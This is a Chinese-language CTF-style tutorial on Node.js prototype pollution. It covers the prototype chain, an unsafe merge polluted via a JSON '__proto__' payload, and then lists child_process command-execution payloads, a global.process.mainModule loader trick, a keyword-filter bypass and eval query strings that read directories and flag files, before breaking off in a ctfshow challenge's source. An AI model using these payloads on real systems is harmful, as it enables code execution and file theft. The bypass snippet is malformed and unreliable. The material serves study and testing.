### Node.js 原型污染漏洞
#### 原理
##### 前置知识：继承与原型链
javascript没有类，只有对象。每个实例对象（object）都有一个私有属性（称之为 `__proto__`）指向它的构造函数的原型对象（
**prototype** ）。该原型对象也有一个自己的原型对象（`__proto__`），层层向上直到一个对象的原型对象为
`null`。根据定义，`null` 没有原型，并作为这个 **原型链**
中的最后一个环节。并不代表null是顶端的对象，位于原型链顶端的是Object.prototype，上面没有了所以是null。Object.prototype对象的原型对象是null。这意味着Object.prototype没有原型，它是原型链的顶端。
几乎所有 JavaScript 中的对象都是位于原型链顶端的Object.prototype的实例。
##### `__proto__`和prototype
###### `__proto__`
当谈到继承时，JavaScript只有一种结构∶对象。每个实例对象(object)都有一个私有属性(称之为`_proto_`
)指向它的构造函数的原型对象（prototype)。该原型对象也有一个自己的原型对象(`_proto_`)，层层向上直到一个对象的原型对象为null。根据定义，null没有原型，并作为这个原型链中的最后一个环节。
###### 看一串代码
    function Son(){}
    var son = new Son();
    console.log(Son.prototype)
    console.log(son.__proto__)//这两种payload都可以用来访问原型对象
    console.log(Son.prototype == son.__proto__)
    输出：
    Son {}
    Son {}//输出一样的。
    true
这个就是个利用点。
这里注意，函数Son实例化成为对象son之后不能通过prototype访问其原型对象了，因为prototype是函数特有的，那我们可以通过`__proto__`来访问他的原型对象。
son是对象，Son是函数。portotype是指向函数的原型，`__proto__`是指向对象的原型。
###### 理解一下区别
`__proto__`是每个JavaScript对象都有的一个属性，它指向该对象的原型。原型是一个对象，它包含了该对象的方法和属性。当我们访问一个对象的属性或方法时，如果该对象本身没有该属性或方法，JavaScript会沿着该对象的原型链向上查找，直到找到该属性或方法为止。prototype是函数对象特有的属性，它指向该函数的原型。原型是一个对象，它包含了该函数的方法和属性。当我们使用new关键字创建一个对象时，JavaScript会将该对象的`__proto__`属性指向该函数的prototype属性。简单来说，`__proto__`是每个对象都有的属性，它指向该对象的原型；而prototype是函数对象特有的属性，它指向该函数的原型。
##### 原型链污染原理：
对于语句：`object[a][b] = value`
如果可以控制a、b、value的值，将a设置为`__proto__`，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。
例如
    object1 = {"a":1, "b":2};
    object1.__proto__.foo = "Hello World";//我们对object1的原型对象设置了一个foo属性
    console.log(object1.foo);//console.log应该是输出函数
    object2 = {"c":1, "d":2};//object1和object2两个对象继承同一个原型对象。
    console.log(object2.foo);//object2没有foo这个属性，所以沿着原型链往上找，找到原型对象的foo并继承，也获得了foo属性。也就是object1的操作把这条原型链都污染了
输出两个Hello World
object1和object2两个对象继承同一个对象。
再次例如
    function Father(){
        this.first_name='Donald'
        this.last_name='Trump'
    }
    function Son(){
        this.first_name='Melania'
    }
    // console.log(Son.prototype)
    Son.prototype = new Father()//把Son的原型对象设置为Father()
    let son = new Son
    console.log(`Name:${son.first_name} ${son.last_name}`)
    输出：
    Name:Melania Trump
只有Son中没有对应属性的时候才会去原型对象找。改不了他本人的，改他爹的，然后让他爹传给他。
    Name：Melania xxhfunction Father(){
        this.first_name='Donald'
        this.last_name='Trump'
    }
    function Son(){
        this.first_name='Melania'
    }
    // console.log(Son.prototype)
    Son.prototype = new Father()
    let son = new Son
    son.__proto__['last_name']='xxh'
    let newson = new Son
    console.log(`Name:${newson.first_name} ${newson.last_name}`)
    输出：
    Name：Melania xxh
又被改了一下。
#### 容易造成原型链污染的操作
##### merge
    function merge(target, source) {
    for (let key in source) {
    if (key in source && key in target) {
    merge(target[key], source[key])
    } else {
    target[key] = source[key]
    }
    }
    }
    let o1 = {}
    let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')//这里的数据要用JSON.parse处理为json格式，不然会将proto识别为键名
    merge(o1, o2)
    console.log(o1.a, o1.b)
    输出：1，2
    o3 = {}
    console.log(o3.b)
    输出：2//说明原型对象已经有b属性了
被加入属性的对象是o1和o1的原生类。我们给o1的加了个a属性赋值了1，给o1的原型对象加了个b属性赋值为2，而不是给o1加了个`__proto__`属性赋值为{"b":
2}。这样原型对象被污染，让o3也有了b属性。
#### 利用方法
##### js中的危险模块和函数
模块:child_process
函数:eval,spwn,exec,setTimeout,setInteval,Function
    payload：
    require('child_process').exec('ls');
    使用require加载child_process的模块
    require('child_process').execSync('ls').toString()
    require('child_process').spawnSync('ls').stdout.toString();
    require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()
    不需要引入模块的：
    global.process.mainModule.constructor._load('child_process').execSync('ls')
    解释：全局对象global的process属性是Node.js进程对象的引用，而其mainModule属性则是指向当前主模块的引用。因此，global.process.mainModule.constructor可以获取到当前主模块的构造函数，再通过其_load方法加载child_process模块并返回其引用。
###### 绕过：
敏感字符：
例如
读取目录，exec被过滤
    require('child_process').execSync('ls').toString()
    法1：
    require('child_process')[exe'%2B'cSync('ls')]toString()
读取函数
    ?eval=require("fs").readdirSync('.')    查看当前目录（换成/.可查看根目录）
    ?eval=require("fs").readFileSync('fl001g.txt') --查看指定文件
ctfshow336（js数组对象）
    var express = require('express');//加载express模块，创建express应用
    var router = express.Router();
    var crypto = require('crypto');//加载crypto模块，进行加密
    function md5(s) {
      return crypto.createHash('md5')
        .update(s)
        .digest('hex');
    }
    /* GET home page. */
    router.get('/', function(req, res, next) {//收到get请求
      res.type('html');
      var flag='xxxxxxx';
      var a = req.query.a;
      var b = req.query.b;